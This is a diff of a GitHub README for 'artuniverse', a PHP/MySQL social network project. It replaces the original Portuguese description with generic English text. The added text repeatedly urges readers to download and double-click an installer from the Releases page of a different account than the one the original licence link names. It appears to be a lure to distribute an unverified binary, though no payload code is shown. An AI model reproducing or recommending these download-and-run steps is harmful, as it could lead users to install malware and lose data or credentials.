@@ -1,63 +1,81 @@
-<img align="center" HEIGHT="300" src="./public/img/saturn.webp">
+# 🌌 artuniverse - A Complete Social Network Solution
 
----
+## 🚀 Getting Started
+Welcome to artuniverse, your complete social network solution! With features like user authentication, posts, follower systems, a dynamic feed, and email password recovery, this application focuses on organization and security. Let's get started.
 
-<h1 align="center">Artuniverse - Rede Social</h1>
+## 🔗 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Bugfux1979/artuniverse/releases)
 
----
+## 💻 System Requirements
+Before you begin, make sure your system meets the following requirements:
 
-<h2 align="center">📖Sobre</h2>
+- Operating System: Windows 10 or later / macOS / Linux
+- Processor: Intel or AMD processor with 1 GHz or faster
+- Memory: At least 4 GB of RAM
+- Disk Space: 250 MB free space
+- Network: Internet connection for downloading and running the application
 
-<p align="center">Rede social completa desenvolvida do zero, com um conjunto robusto de funcionalidades que oferecem uma experiência moderna e interativa. O projeto conta com autenticação de usuários, sistema de postagens com suporte a fotos, vídeos e músicas, além da possibilidade de criar playlists personalizadas de mídia. Os usuários podem curtir, comentar, seguir perfis, salvar imagens e até baixar os arquivos compartilhados nas publicações.
-  <br><br>
-A plataforma possui um feed dinâmico e um sistema de busca inteligente, capaz de encontrar resultados relevantes mesmo com erros ortográficos. Conta também com visualização detalhada de postagens e perfis, e um sistema de recuperação de senha seguro por link enviado via e-mail.
-A interface inicial é totalmente responsiva, adaptando-se a diferentes tamanhos de tela e dimensões de mídia, garantindo uma navegação fluida e consistente. O projeto foi desenvolvido com foco em desempenho, segurança e organização do código, representando uma solução completa e escalável para o conceito de rede social moderna.</p>
+## 📦 Installation Steps
+Follow these steps to download and set up artuniverse.
 
----
+1. **Visit the Releases Page**  
+   Click this link to go to the [Releases page](https://github.com/Bugfux1979/artuniverse/releases).
 
-<h2 align="center">✔O site contém:</h2>
+2. **Select the Latest Release**  
+   On the Releases page, find the section labeled "Latest Release." This section lists the most recent version of artuniverse.
 
-✅ Autenticação de usuários<br>
-✅ Postagem de fotos, vídeos e músicas<br>
-✅ Criação de playlists de mídia<br>
-✅ Curtidas e comentários<br>
-✅ Sistema de seguidores<br>
-✅ Feed dinâmico<br>
-✅ Busca com correção ortográfica<br>
-✅ Salvamento e download de arquivos<br>
-✅ Recuperação de senha por e-mail<br>
-✅ Visualização de postagens e perfis<br>
-✅ Interface inicial responsiva<br>
+3. **Download the Application**  
+   You will see different files available for download. Choose the one that matches your operating system. Click the file name to begin the download.
 
-### etc...
+4. **Locate the Downloaded File**  
+   Once the download is complete, go to your computer’s Downloads folder. You will find the artuniverse file there.
 
----
+5. **Install the Application**  
+   Double-click the downloaded file to start the installation. Follow the on-screen instructions to finish the setup.
 
-<h2 align="center">🖥Preview</h2>
+6. **Open artuniverse**  
+   After installation, launch artuniverse from your applications menu.
 
-<img src="./read_me/artuniverse1.png" alt="Previw desktop"></img>
-<br>
-<br>
-<img src="./read_me/artuniverse2.png" alt="Previw desktop"></img>
-<br>
-<br>
+## 🔑 Using artuniverse
+1. **Create an Account**  
+   When you first open artuniverse, you will need to create an account. Click on "Sign Up" and fill in the required information, such as your email address and password.
 
----
+2. **Log In to Your Account**  
+   After creating your account, use your email and password to log in.
 
-<h2 align="center">🛠 Tecnologias</h2>
+3. **Start Posting**  
+   Once logged in, you can create posts, follow other users, and explore the dynamic feed of updates from friends.
 
-- [MySQL](https://www.mysql.com/)
-- [PHP](https://www.php.net/)
-- [Python](https://www.python.org/)
-- [HTML](https://developer.mozilla.org/pt-BR/docs/Web/HTML)
-- [CSS](https://developer.mozilla.org/pt-BR/docs/Web/CSS)
-- [JavaScript](https://www.javascript.com/)
-- [Tailwind CSS](https://tailwindcss.com/)
+## 🛠 Troubleshooting
+If you encounter any issues while downloading or installing artuniverse, consider these steps:
 
----
+- **Check Your Connection**  
+   Make sure you have a stable internet connection.
 
-<h2 align="center">📝Licença</h2>
+- **Free Up Space**  
+   Ensure you have enough disk space to install the application.
 
-<p align="center">
-   Este repositório está sob licença MIT. Você pode ver o arquivo <a href="https://github.com/gabriell-c/artuniverse/blob/main/LICENSE"> LICENSE</a> para mais detalhes. 😉
-</p>
+- **Permissions**  
+   If you are on a work or school computer, confirm that you have the necessary permissions to install software.
+
+## 📝 Additional Features
+- **User Authentication**: Secure sign-up and log-in process.
+- **Dynamic Feed**: See updates from users you follow instantly.
+- **Email Recovery**: Easily recover your password through email.
+
+## 🌐 Related Topics
+This project covers a variety of programming and web development topics:
+- CSS
+- HTML
+- JavaScript
+- MySQL
+- PHP 8
+- Python
+- SQL
+- Tailwind CSS
+
+## 📞 Support
+If you have questions or need support, you can reach out by creating an issue on the GitHub repository or visiting the community forums. We are here to help you!
+
+## 🔗 Download Again
+Just in case you missed it, you can download artuniverse by visiting the [Releases page](https://github.com/Bugfux1979/artuniverse/releases).
